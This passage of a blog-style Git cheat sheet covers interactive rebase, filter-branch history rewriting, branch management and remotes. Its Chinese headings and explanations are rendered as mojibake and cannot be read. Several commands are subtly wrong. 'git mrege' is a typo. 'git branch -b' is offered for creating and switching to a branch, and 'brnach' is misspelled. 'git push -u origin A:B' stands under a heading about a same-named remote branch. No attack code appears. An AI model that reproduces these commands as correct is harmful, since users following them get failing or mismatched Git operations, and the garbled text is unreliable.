class="comment"># Rebase 5f2452b2..8f33126c onto 5f2452b2 (4 commands)</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># Commands:</span></span><br><span class="line"><span class="comment"># p, pick = use commit</span></span><br><span class="line"><span class="comment"># r, reword = use commit, but edit the commit message</span></span><br><span class="line"><span class="comment"># e, edit = use commit, but stop for amending</span></span><br><span class="line"><span class="comment"># s, squash = use commit, but meld into previous commit</span></span><br><span class="line"><span class="comment"># f, fixup = like "squash", but discard this commit's log message</span></span><br><span class="line"><span class="comment"># x, exec = run command (the rest of the line) using shell</span></span><br><span class="line"><span class="comment"># d, drop = remove commit</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># These lines can be re-ordered; they are executed from top to bottom.</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># If you remove a line here THAT COMMIT WILL BE LOST.</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># However, if you remove everything, the rebase will be aborted.</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># Note that empty commits are commented out</span></span><br></pre></td></tr></table></figure><h3 id="æˆ‘æƒ³ä¿®æ”¹æŸæ¬¡æäº¤ä¿¡æ¯"><a href="#æˆ‘æƒ³ä¿®æ”¹æŸæ¬¡æäº¤ä¿¡æ¯" class="headerlink" title="æˆ‘æƒ³ä¿®æ”¹æŸæ¬¡æäº¤ä¿¡æ¯"></a>æˆ‘æƒ³ä¿®æ”¹æŸæ¬¡æäº¤ä¿¡æ¯</h3><p><code>r</code></p><h3 id="æˆ‘æƒ³å°†å¤šä¸ªæäº¤åˆå¹¶"><a href="#æˆ‘æƒ³å°†å¤šä¸ªæäº¤åˆå¹¶" class="headerlink" title="æˆ‘æƒ³å°†å¤šä¸ªæäº¤åˆå¹¶"></a>æˆ‘æƒ³å°†å¤šä¸ªæäº¤åˆå¹¶</h3><p><code>s</code></p><h3 id="æˆ‘æƒ³åˆ é™¤æŸæ¬¡æäº¤"><a href="#æˆ‘æƒ³åˆ é™¤æŸæ¬¡æäº¤" class="headerlink" title="æˆ‘æƒ³åˆ é™¤æŸæ¬¡æäº¤"></a>æˆ‘æƒ³åˆ é™¤æŸæ¬¡æäº¤</h3><p><code>d</code></p><h3 id="æˆ‘æƒ³å°†-A-åˆ†æ”¯å˜åŸºåˆ°-B-åˆ†æ”¯ä¸Šï¼ˆç§»èŠ±æ¥æœ¨ï¼‰"><a href="#æˆ‘æƒ³å°†-A-åˆ†æ”¯å˜åŸºåˆ°-B-åˆ†æ”¯ä¸Šï¼ˆç§»èŠ±æ¥æœ¨ï¼‰" class="headerlink" title="æˆ‘æƒ³å°† A åˆ†æ”¯å˜åŸºåˆ° B åˆ†æ”¯ä¸Šï¼ˆç§»èŠ±æ¥æœ¨ï¼‰"></a>æˆ‘æƒ³å°† A åˆ†æ”¯å˜åŸºåˆ° B åˆ†æ”¯ä¸Šï¼ˆç§»èŠ±æ¥æœ¨ï¼‰</h3><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ git rebase -<span class="selector-tag">i</span> A B</span><br></pre></td></tr></table></figure><h3 id="æˆ‘æƒ³ä»æ¯ä¸ªcommitç§»é™¤ä¸€ä¸ªæ–‡ä»¶"><a href="#æˆ‘æƒ³ä»æ¯ä¸ªcommitç§»é™¤ä¸€ä¸ªæ–‡ä»¶" class="headerlink" title="æˆ‘æƒ³ä»æ¯ä¸ªcommitç§»é™¤ä¸€ä¸ªæ–‡ä»¶"></a>æˆ‘æƒ³ä»æ¯ä¸ªcommitç§»é™¤ä¸€ä¸ªæ–‡ä»¶</h3><p>è¿™ç»å¸¸å‘ç”Ÿã€‚ æœ‰äººç²—å¿ƒåœ°é€šè¿‡ <code>git add .</code> æäº¤äº†ä¸€ä¸ªå·¨å¤§çš„äºŒè¿›åˆ¶æ–‡ä»¶ï¼Œä½ æƒ³è¦ä»æ‰€æœ‰åœ°æ–¹åˆ é™¤å®ƒã€‚ å¯èƒ½å¶ç„¶åœ°æäº¤äº†ä¸€ä¸ªåŒ…æ‹¬ä¸€ä¸ªå¯†ç çš„æ–‡ä»¶ï¼Œç„¶è€Œä½ æƒ³è¦å¼€æºé¡¹ç›®ã€‚ <code>filter-branch</code> æ˜¯ä¸€ä¸ªå¯èƒ½ä¼šç”¨æ¥æ“¦æ´—æ•´ä¸ªæäº¤å†å²çš„å·¥å…·ã€‚ ä¸ºäº†ä»æ•´ä¸ªæäº¤å†å²ä¸­ç§»é™¤ä¸€ä¸ªå«åš <code>passwords.txt</code> çš„æ–‡ä»¶ï¼Œå¯ä»¥ä½¿ç”¨ <code>--tree-filter</code> é€‰é¡¹ç»™ <code>filter-branch</code>ï¼š</p><figure class="highlight mel"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ git <span class="keyword">filter</span>-branch --tree-<span class="keyword">filter</span> <span class="string">'rm -f passwords.txt'</span> HEAD</span><br></pre></td></tr></table></figure><p><code>--tree-filter</code> é€‰é¡¹åœ¨æ£€å‡ºä»“åº“çš„æ¯ä¸€ä¸ªæäº¤åè¿è¡ŒæŒ‡å®šçš„å‘½ä»¤ç„¶åé‡æ–°æäº¤ç»“æœã€‚åœ¨æœ¬ä¾‹ä¸­ï¼Œä½ ä»æ¯ä¸€ä¸ªå¿«ç…§ä¸­ç§»é™¤äº†ä¸€ä¸ªå«ä½œ <code>passwords.txt</code> çš„æ–‡ä»¶ï¼Œæ— è®ºå®ƒæ˜¯å¦å­˜åœ¨ã€‚é€šå¸¸ä¸€ä¸ªå¥½çš„æƒ³æ³•æ˜¯åœ¨ä¸€ä¸ªæµ‹è¯•åˆ†æ”¯ä¸­åšè¿™ä»¶äº‹ï¼Œç„¶åå½“ä½ å†³å®šæœ€ç»ˆç»“æœæ˜¯çœŸæ­£æƒ³è¦çš„ï¼Œå¯ä»¥ç¡¬é‡ç½® master åˆ†æ”¯ã€‚ ä¸ºäº†è®© <code>filter-branch</code> åœ¨æ‰€æœ‰åˆ†æ”¯ä¸Šè¿è¡Œï¼Œå¯ä»¥ç»™å‘½ä»¤ä¼ é€’ <code>--all</code> é€‰é¡¹ã€‚</p><h3 id="æˆ‘æ›´æ¢äº†é‚®ç®±ï¼Œæƒ³ä¿®æ”¹å†å²æäº¤çš„é‚®ç®±"><a href="#æˆ‘æ›´æ¢äº†é‚®ç®±ï¼Œæƒ³ä¿®æ”¹å†å²æäº¤çš„é‚®ç®±" class="headerlink" title="æˆ‘æ›´æ¢äº†é‚®ç®±ï¼Œæƒ³ä¿®æ”¹å†å²æäº¤çš„é‚®ç®±"></a>æˆ‘æ›´æ¢äº†é‚®ç®±ï¼Œæƒ³ä¿®æ”¹å†å²æäº¤çš„é‚®ç®±</h3><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">$ git <span class="keyword">filter</span>-branch <span class="comment">--commit-filter '</span></span><br><span class="line">        <span class="keyword">if</span> [ "$GIT_AUTHOR_EMAIL" = "schacon@localhost" ];</span><br><span class="line">        <span class="keyword">then</span></span><br><span class="line">                GIT_AUTHOR_NAME="Scott Chacon";</span><br><span class="line">                GIT_AUTHOR_EMAIL="schacon@example.com";</span><br><span class="line">                git <span class="keyword">commit</span>-tree "$@";</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">                git <span class="keyword">commit</span>-tree "$@";</span><br><span class="line">        fi<span class="string">' HEAD</span></span><br></pre></td></tr></table></figure><h3 id="æˆ‘æƒ³åœ¨æ‰€æœ‰åˆ†æ”¯åˆ é™¤æŸä¸ªæ–‡ä»¶ï¼Œå¦‚-password-txt"><a href="#æˆ‘æƒ³åœ¨æ‰€æœ‰åˆ†æ”¯åˆ é™¤æŸä¸ªæ–‡ä»¶ï¼Œå¦‚-password-txt" class="headerlink" title="æˆ‘æƒ³åœ¨æ‰€æœ‰åˆ†æ”¯åˆ é™¤æŸä¸ªæ–‡ä»¶ï¼Œå¦‚ password.txt"></a>æˆ‘æƒ³åœ¨æ‰€æœ‰åˆ†æ”¯åˆ é™¤æŸä¸ªæ–‡ä»¶ï¼Œå¦‚ password.txt</h3><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">filter</span>-branch --<span class="keyword">all</span> --tree-<span class="built_in">filter</span> <span class="string">'rm -f passwords.txt'</span> HEAD</span><br></pre></td></tr></table></figure><h3 id="å˜åŸºå†²çªè§£å†³åæˆ‘è¯¥åšä»€ä¹ˆï¼Ÿ"><a href="#å˜åŸºå†²çªè§£å†³åæˆ‘è¯¥åšä»€ä¹ˆï¼Ÿ" class="headerlink" title="å˜åŸºå†²çªè§£å†³åæˆ‘è¯¥åšä»€ä¹ˆï¼Ÿ"></a>å˜åŸºå†²çªè§£å†³åæˆ‘è¯¥åšä»€ä¹ˆï¼Ÿ</h3><figure class="highlight kotlin"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ git rebase --<span class="keyword">continue</span></span><br></pre></td></tr></table></figure><h3 id="å˜åŸºè¿‡ç¨‹ä¸­æˆ‘æƒ³æ”¾å¼ƒå˜åŸº"><a href="#å˜åŸºè¿‡ç¨‹ä¸­æˆ‘æƒ³æ”¾å¼ƒå˜åŸº" class="headerlink" title="å˜åŸºè¿‡ç¨‹ä¸­æˆ‘æƒ³æ”¾å¼ƒå˜åŸº"></a>å˜åŸºè¿‡ç¨‹ä¸­æˆ‘æƒ³æ”¾å¼ƒå˜åŸº</h3><figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">$</span> git rebase --<span class="keyword">abort</span></span><br></pre></td></tr></table></figure><h2 id="åˆ†æ”¯-1"><a href="#åˆ†æ”¯-1" class="headerlink" title="åˆ†æ”¯"></a>åˆ†æ”¯</h2><h3 id="æ€ä¹ˆåˆ‡æ¢åˆ†æ”¯ï¼Ÿ"><a href="#æ€ä¹ˆåˆ‡æ¢åˆ†æ”¯ï¼Ÿ" class="headerlink" title="æ€ä¹ˆåˆ‡æ¢åˆ†æ”¯ï¼Ÿ"></a>æ€ä¹ˆåˆ‡æ¢åˆ†æ”¯ï¼Ÿ</h3><figure class="highlight accesslog"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ git checkout <span class="string">[branch name]</span></span><br></pre></td></tr></table></figure><h3 id="æ€ä¹ˆåˆ‡æ¢åˆ°ä¸Šä¸€ä¸ªåˆ†æ”¯ï¼Ÿ"><a href="#æ€ä¹ˆåˆ‡æ¢åˆ°ä¸Šä¸€ä¸ªåˆ†æ”¯ï¼Ÿ" class="headerlink" title="æ€ä¹ˆåˆ‡æ¢åˆ°ä¸Šä¸€ä¸ªåˆ†æ”¯ï¼Ÿ"></a>æ€ä¹ˆåˆ‡æ¢åˆ°ä¸Šä¸€ä¸ªåˆ†æ”¯ï¼Ÿ</h3><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$ </span>git checkout -</span><br></pre></td></tr></table></figure><h3 id="æˆ‘å½“å‰åœ¨teståˆ†æ”¯ï¼Œå¹¶æƒ³å°†ver1-0åˆå¹¶åˆ°teståˆ†æ”¯"><a href="#æˆ‘å½“å‰åœ¨teståˆ†æ”¯ï¼Œå¹¶æƒ³å°†ver1-0åˆå¹¶åˆ°teståˆ†æ”¯" class="headerlink" title="æˆ‘å½“å‰åœ¨teståˆ†æ”¯ï¼Œå¹¶æƒ³å°†ver1.0åˆå¹¶åˆ°teståˆ†æ”¯"></a>æˆ‘å½“å‰åœ¨<code>test</code>åˆ†æ”¯ï¼Œå¹¶æƒ³å°†<code>ver1.0</code>åˆå¹¶åˆ°<code>test</code>åˆ†æ”¯</h3><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ git mrege ver1<span class="number">.0</span></span><br></pre></td></tr></table></figure><h3 id="æˆ‘æƒ³å–æ¶ˆåˆå¹¶"><a href="#æˆ‘æƒ³å–æ¶ˆåˆå¹¶" class="headerlink" title="æˆ‘æƒ³å–æ¶ˆåˆå¹¶"></a>æˆ‘æƒ³å–æ¶ˆåˆå¹¶</h3><figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">$</span> git merge --<span class="keyword">abort</span></span><br></pre></td></tr></table></figure><h3 id="æ€ä¹ˆæŸ¥çœ‹å·²ç»åˆå¹¶çš„åˆ†æ”¯ï¼Ÿ"><a href="#æ€ä¹ˆæŸ¥çœ‹å·²ç»åˆå¹¶çš„åˆ†æ”¯ï¼Ÿ" class="headerlink" title="æ€ä¹ˆæŸ¥çœ‹å·²ç»åˆå¹¶çš„åˆ†æ”¯ï¼Ÿ"></a>æ€ä¹ˆæŸ¥çœ‹å·²ç»åˆå¹¶çš„åˆ†æ”¯ï¼Ÿ</h3><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ git branch <span class="comment">--merged</span></span><br></pre></td></tr></table></figure><h3 id="æ€ä¹ˆæŸ¥çœ‹è¿˜æœªåˆå¹¶çš„åˆ†æ”¯ï¼Ÿ"><a href="#æ€ä¹ˆæŸ¥çœ‹è¿˜æœªåˆå¹¶çš„åˆ†æ”¯ï¼Ÿ" class="headerlink" title="æ€ä¹ˆæŸ¥çœ‹è¿˜æœªåˆå¹¶çš„åˆ†æ”¯ï¼Ÿ"></a>æ€ä¹ˆæŸ¥çœ‹è¿˜æœªåˆå¹¶çš„åˆ†æ”¯ï¼Ÿ</h3><figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">$</span> git branch --<span class="keyword">no</span>-merged</span><br></pre></td></tr></table></figure><h3 id="æˆ‘æƒ³æ–°å»ºä¸€ä¸ªåˆ†æ”¯"><a href="#æˆ‘æƒ³æ–°å»ºä¸€ä¸ªåˆ†æ”¯" class="headerlink" title="æˆ‘æƒ³æ–°å»ºä¸€ä¸ªåˆ†æ”¯"></a>æˆ‘æƒ³æ–°å»ºä¸€ä¸ªåˆ†æ”¯</h3><figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ git <span class="keyword">branch </span>[<span class="keyword">branch </span>name]</span><br></pre></td></tr></table></figure><h3 id="æˆ‘æƒ³æ–°å»ºå¹¶åˆ‡æ¢åˆ°æ–°åˆ†æ”¯"><a href="#æˆ‘æƒ³æ–°å»ºå¹¶åˆ‡æ¢åˆ°æ–°åˆ†æ”¯" class="headerlink" title="æˆ‘æƒ³æ–°å»ºå¹¶åˆ‡æ¢åˆ°æ–°åˆ†æ”¯"></a>æˆ‘æƒ³æ–°å»ºå¹¶åˆ‡æ¢åˆ°æ–°åˆ†æ”¯</h3><figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ git <span class="keyword">branch </span>-<span class="keyword">b </span>[<span class="keyword">branch </span>name]</span><br></pre></td></tr></table></figure><h3 id="æˆ‘æƒ³åˆ é™¤å·²åˆå¹¶çš„åˆ†æ”¯"><a href="#æˆ‘æƒ³åˆ é™¤å·²åˆå¹¶çš„åˆ†æ”¯" class="headerlink" title="æˆ‘æƒ³åˆ é™¤å·²åˆå¹¶çš„åˆ†æ”¯"></a>æˆ‘æƒ³åˆ é™¤å·²åˆå¹¶çš„åˆ†æ”¯</h3><figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ git <span class="keyword">branch </span>-d [<span class="keyword">branch </span>name]</span><br></pre></td></tr></table></figure><h3 id="æˆ‘æƒ³å¼ºåˆ¶åˆ é™¤æœªåˆå¹¶çš„åˆ†æ”¯"><a href="#æˆ‘æƒ³å¼ºåˆ¶åˆ é™¤æœªåˆå¹¶çš„åˆ†æ”¯" class="headerlink" title="æˆ‘æƒ³å¼ºåˆ¶åˆ é™¤æœªåˆå¹¶çš„åˆ†æ”¯"></a>æˆ‘æƒ³å¼ºåˆ¶åˆ é™¤æœªåˆå¹¶çš„åˆ†æ”¯</h3><figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ git <span class="keyword">branch </span>-D [<span class="keyword">brnach </span>name]</span><br></pre></td></tr></table></figure><h3 id="æˆ‘æƒ³å°†å¦ä¸€ä¸ªåˆ†æ”¯çš„æŸæ¬¡æäº¤åº”ç”¨åˆ°å½“å‰åˆ†æ”¯"><a href="#æˆ‘æƒ³å°†å¦ä¸€ä¸ªåˆ†æ”¯çš„æŸæ¬¡æäº¤åº”ç”¨åˆ°å½“å‰åˆ†æ”¯" class="headerlink" title="æˆ‘æƒ³å°†å¦ä¸€ä¸ªåˆ†æ”¯çš„æŸæ¬¡æäº¤åº”ç”¨åˆ°å½“å‰åˆ†æ”¯"></a>æˆ‘æƒ³å°†å¦ä¸€ä¸ªåˆ†æ”¯çš„æŸæ¬¡æäº¤åº”ç”¨åˆ°å½“å‰åˆ†æ”¯</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ git cherry-pick [<span class="keyword">commit</span>-<span class="keyword">id</span>]</span><br></pre></td></tr></table></figure><h3 id="æ€ä¹ˆä¿®æ”¹åˆ†æ”¯åï¼Ÿ"><a href="#æ€ä¹ˆä¿®æ”¹åˆ†æ”¯åï¼Ÿ" class="headerlink" title="æ€ä¹ˆä¿®æ”¹åˆ†æ”¯åï¼Ÿ"></a>æ€ä¹ˆä¿®æ”¹åˆ†æ”¯åï¼Ÿ</h3><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ git branch -m [<span class="built_in">old</span> <span class="type">name</span>] [<span class="built_in">new</span> <span class="type">name</span>]</span><br></pre></td></tr></table></figure><h3 id="æ€ä¹ˆå°†æœ¬åœ°åˆ†æ”¯ä¸è¿œç¨‹åˆ†æ”¯å»ºç«‹è·Ÿè¸ªå…³ç³»ï¼Ÿ"><a href="#æ€ä¹ˆå°†æœ¬åœ°åˆ†æ”¯ä¸è¿œç¨‹åˆ†æ”¯å»ºç«‹è·Ÿè¸ªå…³ç³»ï¼Ÿ" class="headerlink" title="æ€ä¹ˆå°†æœ¬åœ°åˆ†æ”¯ä¸è¿œç¨‹åˆ†æ”¯å»ºç«‹è·Ÿè¸ªå…³ç³»ï¼Ÿ"></a>æ€ä¹ˆå°†æœ¬åœ°åˆ†æ”¯ä¸è¿œç¨‹åˆ†æ”¯å»ºç«‹è·Ÿè¸ªå…³ç³»ï¼Ÿ</h3><figure class="highlight accesslog"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ git branch -t <span class="string">[branch name]</span> <span class="string">[remote-branch]</span></span><br></pre></td></tr></table></figure><h3 id="æ€ä¹ˆæŸ¥çœ‹è¿œç¨‹åˆ†æ”¯ï¼Ÿ"><a href="#æ€ä¹ˆæŸ¥çœ‹è¿œç¨‹åˆ†æ”¯ï¼Ÿ" class="headerlink" title="æ€ä¹ˆæŸ¥çœ‹è¿œç¨‹åˆ†æ”¯ï¼Ÿ"></a>æ€ä¹ˆæŸ¥çœ‹è¿œç¨‹åˆ†æ”¯ï¼Ÿ</h3><figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ git <span class="keyword">branch </span>-r</span><br></pre></td></tr></table></figure><h3 id="æˆ‘æœ¬åœ°æ²¡æœ‰åˆ«äººæ–°æ¨é€çš„è¿œç¨‹åˆ†æ”¯"><a href="#æˆ‘æœ¬åœ°æ²¡æœ‰åˆ«äººæ–°æ¨é€çš„è¿œç¨‹åˆ†æ”¯" class="headerlink" title="æˆ‘æœ¬åœ°æ²¡æœ‰åˆ«äººæ–°æ¨é€çš„è¿œç¨‹åˆ†æ”¯"></a>æˆ‘æœ¬åœ°æ²¡æœ‰åˆ«äººæ–°æ¨é€çš„è¿œç¨‹åˆ†æ”¯</h3><p>è¯·ä½¿ç”¨<code>git fetch</code>å‘½ä»¤æ›´æ–°ä¸€ä¸‹</p><h3 id="è¿œç¨‹ä»“åº“åä¸ºoriginï¼Œæ€ä¹ˆå°†æœ¬åœ°çš„-A-åˆ†æ”¯æ¨é€åˆ°è¿œç¨‹å¹¶å»ºç«‹åŒååˆ†æ”¯ï¼Ÿ"><a href="#è¿œç¨‹ä»“åº“åä¸ºoriginï¼Œæ€ä¹ˆå°†æœ¬åœ°çš„-A-åˆ†æ”¯æ¨é€åˆ°è¿œç¨‹å¹¶å»ºç«‹åŒååˆ†æ”¯ï¼Ÿ" class="headerlink" title="è¿œç¨‹ä»“åº“åä¸ºoriginï¼Œæ€ä¹ˆå°†æœ¬åœ°çš„ A åˆ†æ”¯æ¨é€åˆ°è¿œç¨‹å¹¶å»ºç«‹åŒååˆ†æ”¯ï¼Ÿ"></a>è¿œç¨‹ä»“åº“åä¸ºoriginï¼Œæ€ä¹ˆå°†æœ¬åœ°çš„ A åˆ†æ”¯æ¨é€åˆ°è¿œç¨‹å¹¶å»ºç«‹åŒååˆ†æ”¯ï¼Ÿ</h3><figure class="highlight maxima"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ git <span class="built_in">push</span> -u <span class="built_in">origin</span> A:B</span><br></pre></td></tr></table></figure><h3 id="è¿œç¨‹ä»“åº“åä¸ºoriginï¼Œæˆ‘æƒ³åˆ é™¤originçš„åˆ†æ”¯B"><a href="#è¿œç¨‹ä»“åº“åä¸ºoriginï¼Œæˆ‘æƒ³åˆ é™¤originçš„åˆ†æ”¯B" class="headerlink" title="è¿œç¨‹ä»“åº“åä¸ºoriginï¼Œæˆ‘æƒ³åˆ é™¤originçš„åˆ†æ”¯B"></a>è¿œç¨‹ä»“åº“åä¸ºoriginï¼Œæˆ‘æƒ³åˆ é™¤originçš„åˆ†æ”¯B</h3><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$ </span>git push -u origin <span class="symbol">:B</span></span><br></pre></td></tr></table></figure><h3 id="æˆ‘å°†-5-ä¸ªæäº¤æ¨é€åˆ°äº†è¿œç¨‹ä»“åº“ï¼Œä½†å‘ç°ç¬¬3ä¸ªæäº¤éœ€è¦æ’¤å›ï¼Œæˆ‘è¯¥å¦‚ä½•æ“ä½œï¼Ÿ"><a href="#æˆ‘å°†-5-ä¸ªæäº¤æ¨é€åˆ°äº†è¿œç¨‹ä»“åº“ï¼Œä½†å‘ç°ç¬¬3ä¸ªæäº¤éœ€è¦æ’¤å›ï¼Œæˆ‘è¯¥å¦‚ä½•æ“ä½œï¼Ÿ" class="headerlink" title="æˆ‘å°† 5 ä¸ªæäº¤æ¨é€åˆ°äº†è¿œç¨‹ä»“åº“ï¼Œä½†å‘ç°ç¬¬3ä¸ªæäº¤éœ€è¦æ’¤å›ï¼Œæˆ‘è¯¥å¦‚ä½•æ“ä½œï¼Ÿ"></a>æˆ‘å°† 5 ä¸ªæäº¤æ¨é€åˆ°äº†è¿œç¨‹ä»“åº“ï¼Œä½†å‘ç°ç¬¬3ä¸ªæäº¤éœ€è¦æ’¤å›ï¼Œæˆ‘è¯¥å¦‚ä½•æ“ä½œï¼Ÿ</h3><p>æ­¤æ—¶ï¼Œä½ åº”è¯¥ä½¿ç”¨<code>git revert [commit-id]</code>ï¼Œæ— è®ºè¿™ä¸ªæäº¤åœ¨logçš„å“ªä¸ªä½ç½®ï¼Œéƒ½ä¸ä¼šå½±å“ä¸Šä¸‹çš„æäº¤ï¼Œè€Œä¸”å®ƒä¼šå°†æ’¤é”€çš„ä½œä¸ºä¸€ä¸ªæ–°çš„æäº¤ï¼Œå› æ­¤<code>revert</code>å‘½ä»¤ä¸»è¦ç”¨äºæ¨é€åˆ°è¿œç¨‹ä»“åº“çš„ä¿®æ”¹ã€‚</p><p>å¦‚æœä½ ä½¿ç”¨äº†<code>git reset</code>ä¼šæœ‰ä»€ä¹ˆä¸åŒå‘¢ï¼Ÿ</p><p>å¦‚æœä¸€ä¸ªæäº¤åœ¨logçš„ä¸­é—´ä½ç½®ï¼Œé‚£ä¹ˆresetè¿™ä¸ªæäº¤ä¹‹åçš„æäº¤æœ‰å¯èƒ½éƒ½ä¼šæ¶ˆå¤±æ‰ï¼å°¤å…¶åœ¨å¤šäººåä½œä¸­ï¼Œä½ å°†åä¸¤ä¸ªæäº¤åˆ é™¤ï¼Œå¹¶æ¨é€åˆ°è¿œç¨‹ï¼Œè€Œåˆ«äººæœ¬åœ°è¿˜æ˜¯ 5 ä¸ªæäº¤ï¼Œè¿™å°†å¯¼è‡´åˆ†æ”¯çš„æ··ä¹±ï¼Œè¯·æ¸…æ¥šä½ çš„æ¯ä¸€æ­¥æ“ä½œä¸åæœï¼Œè°¨æ…ä½¿ç”¨æ¯ä¸ªå‘½ä»¤ã€‚</p><h2 id="è¿œç¨‹ä»“åº“-1"><a href="#è¿œç¨‹ä»“åº“-1" class="headerlink" title="è¿œç¨‹ä»“åº“"></a>è¿œç¨‹ä»“åº“</h2><h3 id="æ€ä¹ˆæŸ¥çœ‹æ‰€æœ‰å…³è”çš„è¿œç¨‹ä»“åº“åç§°"><a href="#æ€ä¹ˆæŸ¥çœ‹æ‰€æœ‰å…³è”çš„è¿œç¨‹ä»“åº“åç§°" class="headerlink" title="æ€ä¹ˆæŸ¥çœ‹æ‰€æœ‰å…³è”çš„è¿œç¨‹ä»“åº“åç§°"></a>æ€ä¹ˆæŸ¥çœ‹æ‰€æœ‰å…³è”çš„è¿œç¨‹ä»“åº“åç§°</h3><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$ </span>git remote</span><br></pre></td></tr></table></figure><h3 id="æˆ‘æƒ³æŸ¥çœ‹è¿œç¨‹ä»“åº“çš„åœ°å€"><a href="#æˆ‘æƒ³æŸ¥çœ‹è¿œç¨‹ä»“åº“çš„åœ°å€" class="headerlink" title="æˆ‘æƒ³æŸ¥çœ‹è¿œç¨‹ä»“åº“çš„åœ°å€"></a>æˆ‘æƒ³æŸ¥çœ‹è¿œç¨‹ä»“åº“çš„åœ°å€</h3><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$ </span>git remote -v</span><br></pre></td></tr></table></figure><h3 id="æˆ‘æƒ³å°†æœ¬åœ°å·²æœ‰ä»“åº“ä¸è¿œç¨‹ä»“åº“å…³è”"><a href="#æˆ‘æƒ³å°†æœ¬åœ°å·²æœ‰ä»“åº“ä¸è¿œç¨‹ä»“åº“å…³è”" class="headerlink" title="æˆ‘æƒ³å°†æœ¬åœ°å·²æœ‰ä»“åº“ä¸è¿œç¨‹ä»“åº“å…³è”"></a>æˆ‘æƒ³å°†æœ¬åœ°å·²æœ‰ä»“åº“ä¸è¿œç¨‹ä»“åº“å…³è”</h3><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ git remote <span class="keyword">add</span><span class="bash"> æœ¬åœ°è¿œç¨‹ä»“åº“å url|path</span></span><br></pre></td></tr></table></figure><h3 id="æˆ‘æƒ³å–æ¶ˆè¿œç¨‹ä»“åº“çš„å…³è”"><a href="#æˆ‘æƒ³å–æ¶ˆè¿œç¨‹ä»“åº“çš„å…³è”" class="headerlink" title="æˆ‘æƒ³å–æ¶ˆè¿œç¨‹ä»“åº“çš„å…³è”"></a>æˆ‘æƒ³å–æ¶ˆè¿œç¨‹ä»“åº“çš„å…³è”</h3><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$ </span>git remote rm æœ¬åœ°è¿œç¨‹ä»“åº“å</span><br></pre></td></tr></table></figure><h3 id="æˆ‘æƒ³é‡å‘½åè¿œç¨‹ä»“åº“"><a href="#æˆ‘æƒ³é‡å‘½åè¿œç¨‹ä»“åº“" class="headerlink" title="æˆ‘æƒ³é‡å‘½åè¿œç¨‹ä»“åº“"></a>æˆ‘æƒ³é‡å‘½åè¿œç¨‹ä»“åº“</h3><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ git remote <span class="keyword">rename</span> [<span class="built_in">old</span> <span class="type">name</span>] [<span class="built_in">new</span> <span class="type">name</span>]</span><br></pre></td></tr></table></figure><h2 id="æ£€ç´¢"><a href="#æ£€ç´¢" class="headerlink" title="æ£€ç´¢"></a>æ£€ç´¢</h2><h3 id="æˆ‘æƒ³åœ¨é¡¹ç›®ä¸­æŸ¥æ‰¾æŸä¸ªå…³é”®è¯ï¼Œå¹¶è¾“å‡ºæ‰€åœ¨è¡Œå·"><a href="#æˆ‘æƒ³åœ¨é¡¹ç›®ä¸­æŸ¥æ‰¾æŸä¸ªå…³é”®è¯ï¼Œå¹¶è¾“å‡ºæ‰€åœ¨è¡Œå·" class="headerlink" 